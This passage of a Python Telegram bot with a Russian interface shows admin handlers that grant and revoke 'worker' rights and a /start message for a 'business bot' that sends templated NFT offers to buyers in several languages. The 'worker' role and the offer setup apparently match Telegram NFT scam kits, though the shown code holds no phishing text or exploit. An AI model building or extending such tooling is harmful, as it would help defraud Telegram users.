    cursor.execute("SELECT COUNT(*) FROM users WHERE is_worker = 1")
    count = cursor.fetchone()[0]
    if count == 0:
        text = "🟢 <b>Воркеров пока нет</b>\n\nДобавь через «➕ Выдать права»."
    else:
        text = (
            f"👥 <b>Воркеры ({count})</b>\n\n"
            "Нажми на воркера, чтобы <b>забрать права</b>."
        )
    await cb.message.edit_text(text, parse_mode="HTML", reply_markup=build_workers_kb())


@router.callback_query(F.data == "adm_list")
async def adm_list(cb: CallbackQuery):
    if cb.from_user.id != MASTER_ADMIN_ID:
        await cb.answer("⛔", show_alert=True); return
    await render_workers_list(cb)
    await cb.answer()


@router.callback_query(F.data.startswith("rm_"))
async def adm_remove_worker(cb: CallbackQuery):
    if cb.from_user.id != MASTER_ADMIN_ID:
        await cb.answer("⛔", show_alert=True); return
    try:
        target_id = int(cb.data[3:])
    except ValueError:
        await cb.answer("❌ Ошибка ID", show_alert=True); return
    u = get_user(target_id)
    if not u or u[2] != 1:
        await cb.answer("❌ Уже не воркер", show_alert=True)
        await render_workers_list(cb)
        return
    uname = u[1] or ""
    set_worker(target_id, 0)
    label = f"@{uname}" if uname else f"ID {target_id}"
    await cb.answer(f"✅ Права забраны у {label}", show_alert=True)
    await render_workers_list(cb)


@router.callback_query(F.data == "adm_back")
async def adm_back(cb: CallbackQuery):
    if cb.from_user.id != MASTER_ADMIN_ID:
        await cb.answer("⛔", show_alert=True); return
    await show_admin_panel(cb, edit=True)
    await cb.answer()


@router.callback_query(F.data == "adm_grant")
async def adm_grant(cb: CallbackQuery, state: FSMContext):
    if cb.from_user.id != MASTER_ADMIN_ID:
        await cb.answer("⛔", show_alert=True); return
    await state.set_state(GrantStates.waiting_id)
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Отмена", callback_data="adm_back")]])
    await cb.message.edit_text(
        "➕ <b>Выдача прав</b>\n\nОтправьте <b>user_id</b> или <b>@username</b>:",
        parse_mode="HTML", reply_markup=kb
    )
    await cb.answer()


@router.message(GrantStates.waiting_id)
async def process_grant(message: Message, state: FSMContext):
    if message.from_user.id != MASTER_ADMIN_ID:
        return
    arg = message.text.strip()
    target_id, target_username = await _resolve_target(arg)
    if not target_id:
        await message.answer("❌ Не удалось определить пользователя. Введите ID или @username.", reply_markup=admin_kb())
        return
    set_worker(target_id, 1, target_username)
    await state.clear()
    await message.answer(
        f"✅ Права выданы: <code>{target_id}</code>" + (f" (@{target_username})" if target_username else ""),
        parse_mode="HTML", reply_markup=admin_kb()
    )


async def _resolve_target(arg: str):
    arg = arg.strip()
    if arg.startswith("@"):
        uname = arg[1:]
        cursor.execute("SELECT user_id, username FROM users WHERE LOWER(username) = ?", (uname.lower(),))
        row = cursor.fetchone()
        if row:
            return row[0], row[1]
        return None, None
    if arg.isdigit():
        uid = int(arg)
        u = get_user(uid)
        return uid, (u[1] if u else "")
    return None, None


# ---------- /start ----------
@router.message(Command("start"))
async def start_cmd(message: Message):
    add_user(message.from_user.id, message.from_user.username or "")
    await message.answer(
        "👋 <b>Привет!</b>\n\n"
        "Это <b>бизнес-бот для NFT-офферов</b>.\n\n"
        "Подключи его к своему Telegram-аккаунту как <b>бизнес-бота</b> "
        "(Настройки → Telegram Business → Чат-боты), затем в чате с покупателем отправь:\n\n"
        "<code>.offer t.me/nft/ChillFlame-101210 500 stars ru 1</code>\n\n"
        "Формат: <code>.offer &lt;ссылка&gt; &lt;сумма&gt; &lt;stars|gram&gt; &lt;язык&gt; [1|2]</code>\n"
        "Языки: ru, en, uk, ar, fa, zh\n"
        "Вариант (необязательно): 1 — большой, 2 — короткий (по умолч. 1)",
        parse_mode="HTML"
    )


async def main():
    global BOT_USERNAME
    dp.include_router(router)
    me = await bot.get_me()
    BOT_USERNAME = me.username or ""
    print(f"✅ Бизнес-бот @{BOT_USERNAME} запущен!")
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())